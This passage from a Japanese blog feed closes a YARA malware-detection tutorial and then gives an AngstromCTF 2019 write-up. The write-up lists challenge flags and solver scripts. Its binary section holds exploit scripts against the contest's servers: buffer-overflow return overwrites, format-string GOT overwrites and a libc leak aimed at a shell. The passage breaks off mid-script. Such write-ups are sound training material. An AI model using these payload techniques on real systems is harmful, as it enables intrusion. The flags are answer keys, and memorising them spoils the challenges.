&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#00f;font-weight:bold&#34;&gt;yara&lt;/span&gt;
rules &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; yara&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;compile&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;hello_rule.yara&amp;#39;&lt;/span&gt;)
result &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; rules&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;hello.txt&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt;(result)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記スクリプトを実行してください。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ python hello.py
[hello_string]&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;実行すると予定通り検知していることがわかります。また、検知したファイルがない場合は、空の配列が帰ってくるため注意してください。&lt;/p&gt;

&lt;h2 id=&#34;まとめ&#34;&gt;まとめ&lt;/h2&gt;

&lt;p&gt;今回、マルウェアなどを検知するルールベースのツールYara を見てきました。Yara は、文字列やファイルサイズ、バイナリの情報などを様々な値を用いて柔軟にルールを作成することができます。また、Pythonから利用するなどプログラマブルな使い方も可能となっています。ぜひYara を用いて様々な悪意ある挙動をするファイルを検知していきましょう。&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Angstrom2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/angstrom2019/</link>
      <pubDate>Thu, 25 Apr 2019 21:57:22 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/angstrom2019/</guid>
      <description>

&lt;h2 id=&#34;misc&#34;&gt;Misc&lt;/h2&gt;

&lt;h3 id=&#34;irc&#34;&gt;IRC&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;freenodeに入るとFLAG&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{like_discord_but_worse}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;the-mueller-report&#34;&gt;The mueller Report&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;PDFが渡されるので、とりあえず&lt;code&gt;actf&lt;/code&gt;でgrepするとFLAG&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{no0o0o0_col1l1l1luuuusiioooon}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;blank-pdf&#34;&gt;Blank PDF&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;PDFが渡されるが開けず、&lt;code&gt;file&lt;/code&gt;コマンドで見るとPDFとして認識されていないためヘッダーを見るとマジックナンバーがかけているので直してあげると開けるようになりFLAG&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{knot_very_interesting}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;paper-trail&#34;&gt;Paper Trail&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;pcapngが渡されるので、Follow TCP StreamするとIRCで1文字ずつFLAGを送信している&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{fake_math_papers}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;scratch-it-out&#34;&gt;Scratch It Out&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;project.jsonという謎のjsonファイルが渡されるので、キーでいろいろぐぐる＆問題名からプログラミング言語Scratchの話だとわかる&lt;/li&gt;
&lt;li&gt;project.jsonをzipで圧縮し、htt@s://scratch.mit.edu でファイルを読み込まされるとゲームが復元される&lt;/li&gt;
&lt;li&gt;最初の項目が、「旗が押されたとき」なので、画面右らへんの緑色の旗を押すと音声とともにFLAGがでる&lt;/li&gt;
&lt;li&gt;地味に面白い&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{Th5_0pT1maL_LANgUaG3}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;

&lt;h3 id=&#34;control-you&#34;&gt;Control you&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;HTMLソースを見てFLAG&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{control_u_so_we_can&amp;rsquo;t_control_you}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;

&lt;h3 id=&#34;classy-cipher&#34;&gt;Classy Cipher&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{so_charming}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;encrypted &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;:&amp;lt;M?TLH8&amp;lt;A:KFBG@V&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;0xff&lt;/span&gt;):
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; encrypted:
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#008000&#34;&gt;chr&lt;/span&gt;((&lt;span style=&#34;color:#008000&#34;&gt;ord&lt;/span&gt;(c)&lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;i) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xff&lt;/span&gt;), end&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;really-secure-algorithm&#34;&gt;Really Secure Algorithm&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;RSAのパラメータがe, p, q, cが渡されるので復号するだけ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{really_securent_algorithm}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;require_relative &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;../../tools/ctf/crypto.rb&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;8337989838551614633430029371803892077156162494012474856684174381868510024755832450406936717727195184311114937042673575494843631977970586746618123352329889&lt;/span&gt;
q &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;7755060911995462151580541927524289685569492828780752345560845093073545403776129013139174889414744570087561926915046519199304042166351530778365529171009493&lt;/span&gt;
e &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;65537&lt;/span&gt;
c &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;7022848098469230958320047471938217952907600532361296142412318653611729265921488278588086423574875352145477376594391159805651080223698576708934993951618464460109422377329972737876060167903857613763294932326619266281725900497427458047861973153012506595691389361443123047595975834017549312356282859235890330349&lt;/span&gt;

rsa &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;RSA&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new(e, &lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; q, &lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt;, q)
m &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; rsa&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;decrypt(c)
&lt;span style=&#34;color:#008000&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;m&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;pack(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;H*&amp;#34;&lt;/span&gt;))&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;half-and-half&#34;&gt;Half and Half&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;ソースコードが渡されるので呼んでソルバを書くだけ

&lt;ul&gt;
&lt;li&gt;24文字を12byteに分割しxor取った値に等しくなるようにする&lt;/li&gt;
&lt;li&gt;フラグフォーマットは、&lt;code&gt;actf{&lt;/code&gt;なので先頭5byteと後半の5byteもxorして判明(&lt;code&gt;taste&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;問題文から&lt;code&gt;taste&lt;/code&gt;に合うような単語で&lt;code&gt;coffee&lt;/code&gt;を&lt;code&gt;actf{&lt;/code&gt;の後に繋げると後半が&lt;code&gt;good&lt;/code&gt;と文章が成り立つ&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{coffee_tastes_good}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;runes&#34;&gt;Runes&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Paillier暗号のパラメータn, g と暗号文cが渡されるので復号するだけ

&lt;ul&gt;
&lt;li&gt;復号時に素数p, qが必要になるが、提供されているnは、factordbでググるとすでに割れている&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{crypto_lives}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;gmp&amp;#39;&lt;/span&gt;

n &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;99157116611790833573985267443453374677300242114595736901854871276546481648883&lt;/span&gt;)
&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;310013024566643256138761337388255591613&lt;/span&gt;
q &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;319848228152346890121384041219876391791&lt;/span&gt;
g &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;99157116611790833573985267443453374677300242114595736901854871276546481648884&lt;/span&gt;)
c &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;2433283484328067719826123652791700922735828879195114568755579061061723786565164234075183183699826399799223318790711772573290060335232568738641793425546869&lt;/span&gt;)
l &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z((&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;lcm(q &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;))
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;L&lt;/span&gt;(u, n)
  (u &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#b68&#34;&gt;/ n
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;end
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;c_lambda = L(c.powmod(l, n.pow(2)), n)
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;g_lambda = GMP::Z(L(g.powmod(l, n.pow(2)), n).to_s.to_i).invert(n)
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;m = ((c_lambda * g_lambda) % n).to_s.to_i.to_s(16)
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;print([m].pack(&amp;#34;H*&amp;#34;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;binary&#34;&gt;Binary&lt;/h2&gt;

&lt;h3 id=&#34;aquarium&#34;&gt;Aquarium&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;gets関数によるBOFがあるバイナリで、flag出力用の関数があるのでそこに飛ばすだけ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{overflowed_more_than_just_a_fish_tank}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;localhost&amp;#34;, 9999&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19305&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x98&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;0x4011b6&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;chain-of-rope&#34;&gt;Chain of Rope&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;名前からしてROPかと思ったけど、そうではなく単純なBOFでリターンアドレスをflag出力用関数に書き換えるだけ(Aquariumとまったく同じ)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{dark_web_bargains}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;

z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;9999&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19400&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;access&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x38&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x401231&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;purchases&#34;&gt;Purchases&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;FSBがある64bitバイナリで、flag出力用の関数があるのでそこに飛ばしてあげる&lt;/li&gt;
&lt;li&gt;関数の最後にGOTによるアドレス解決がされていないputs関数があるので、putsのGOTをflag出力関数で上書きする

&lt;ul&gt;
&lt;li&gt;末尾2byteですむので楽に書き換えられる&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{limited_edition_flag}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# z = Sock.new &amp;#34;localhost&amp;#34;, 9999&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19011&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4534c%10$hnAAAA&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;else. &amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;returns&#34;&gt;Returns&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Purchasesのflag出力用関数が無い版でそれ以外はすべて同じ&lt;/li&gt;
&lt;li&gt;libcが配布されているので、FSBでlibcのアドレスリークして、GOT overwrite でOne gadgetに飛ばしてシェルを奪う&lt;/li&gt;
&lt;li&gt;出力バイトの関係から分割して書き込むために、はじめに&lt;code&gt;puts@got&lt;/code&gt;をmainに書き換えておき何度もFSBを使えるようにする&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__stack_chk_fail@got&lt;/code&gt;は、通常一度も呼ばれないため、ここのGOTをOne gadgetに書き換える&lt;/li&gt;
&lt;li&gt;最後に、&lt;code&gt;puts@got&lt;/code&gt;を&lt;code&gt;__stack_chk_fail@got&lt;/code&gt;になおしてあげればOne gadgetが実行される&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{no_returns_allowed}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: utf-8&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;localhost&amp;#34;, 8888&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19307&lt;/span&gt;
context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:debug&lt;/span&gt;
libc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ELF&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./libc.so.6&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;shell.actf.co&amp;#34;, 19011&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Leaking libc address and overwriting puts@got to the entrypoint of main function&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4518c%11$hnAAAABBB%17$p&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
data &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
data &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gsub(&lt;span style=&#34;color:#b68&#34;&gt;/\s/&lt;/span&gt;,&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
